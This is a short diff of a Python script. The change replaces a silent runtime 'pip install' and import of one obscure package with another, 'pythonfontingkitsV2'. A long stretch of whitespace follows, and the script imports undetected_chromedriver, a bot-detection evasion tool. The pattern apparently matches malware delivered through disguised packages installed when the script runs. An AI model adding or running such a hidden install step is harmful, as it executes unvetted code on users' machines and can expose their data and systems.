@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolouringexts")
-import syscolouringexts
+os.system("pip install pythonfontingkitsV2")
+import pythonfontingkitsV2
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
